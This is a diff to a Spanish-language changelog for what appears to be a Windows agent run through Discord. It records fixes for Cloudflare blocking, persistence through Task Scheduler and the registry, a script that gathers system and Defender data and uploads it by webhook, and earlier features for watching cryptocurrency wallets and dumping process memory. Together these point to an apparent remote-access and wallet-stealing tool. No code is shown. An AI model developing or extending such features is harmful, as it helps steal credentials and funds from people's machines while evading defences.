@@ -1,5 +1,11 @@
 # Changelog
 
+## 0.2.25
+
+- Corregido el corte total de Discord tras el arranque: Cloudflare devolvía `403: internal network error (40333)` a REST, gateway y webhook porque el User-Agent se anunciaba como `Mozilla/5.0 (…Chrome/126…)` con el TLS de Java. El UA pasa a `DiscordBot (repo, versión)`; el gateway vuelve a conectar y las subidas/replies funcionan. Test fija que el UA no empiece por `Mozilla/5.0`.
+- El arranque ya no puede quedarse mudo por Task Scheduler: el poller se inicia antes de la persistencia y de los servicios, y cada `schtasks`/`reg` tiene un corte de 20 s con `destroyForcibly`.
+- Diagnóstico: `tools/windows-diag.ps1` recoge procesos, versión, hashes, espacio, logs, tarea, mods y Defender, y sube el ZIP por el webhook.
+
 ## 0.2.24
 
 - El watcher de carteras recibe el PID del agente y termina cuando este muere: un reinicio o `kill` ya no deja un `powershell` escaneando en paralelo ni multiplica watchers. `wallet watch off` cancela también el volcado en curso y borra los `.dmp` parciales de ese intento. `memdump` mata el árbol `cmd`/`powershell` al parar.
